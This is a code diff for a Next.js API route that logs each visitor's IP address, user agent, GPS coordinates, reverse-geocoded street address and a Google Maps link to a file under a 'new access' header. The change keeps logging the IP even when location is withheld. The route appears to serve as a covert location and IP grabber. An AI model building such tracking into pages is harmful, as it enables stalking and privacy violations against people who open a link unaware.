@@ -23,24 +23,31 @@ async function getAddress(lat: number, lon: number): Promise<string> {
 export async function POST(request: Request) {
   try {
     const body = await request.json();
-    const { lat, lon, acc } = body;
-
-    if (lat === undefined || lon === undefined) {
-      return NextResponse.json({ error: 'Missing location data' }, { status: 400 });
-    }
+    const { lat, lon, acc, ip } = body;
 
     const headersList = headers();
     const ua = headersList.get('user-agent') ?? 'unknown';
-
-    const address = await getAddress(lat, lon);
-    const maps_link = `https://www.google.com/maps?q=${lat},${lon}`;
     
+    // Prioritize IP from client, fallback to headers
+    const clientIp = ip || headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || 'N/A';
+    
+    // Clean up IPv6 mapped IPv4 addresses e.g. ::ffff:123.45.67.89
+    const finalIp = clientIp.startsWith('::ffff:') ? clientIp.substring(7) : clientIp;
+
     let logData = `--- [${new Date().toISOString()}] MỚI TRUY CẬP ---\n`;
     logData += `Thiết bị: ${ua}\n`;
-    logData += `Tọa độ: ${lat}, ${lon}\n`;
-    logData += `Độ chính xác: ${acc || 'N/A'}m\n`;
-    logData += `Địa chỉ: ${address}\n`;
-    logData += `Link Google Maps: ${maps_link}\n`;
+    logData += `Địa chỉ IP: ${finalIp}\n`;
+
+    if (lat !== undefined && lon !== undefined) {
+      const address = await getAddress(lat, lon);
+      const maps_link = `https://www.google.com/maps?q=${lat},${lon}`;
+      
+      logData += `Tọa độ: ${lat}, ${lon}\n`;
+      logData += `Độ chính xác: ${acc || 'N/A'}m\n`;
+      logData += `Địa chỉ: ${address}\n`;
+      logData += `Link Google Maps: ${maps_link}\n`;
+    }
+    
     logData += `----------------------------------\n`;
 
     const logDir = path.join(process.cwd(), 'logs');
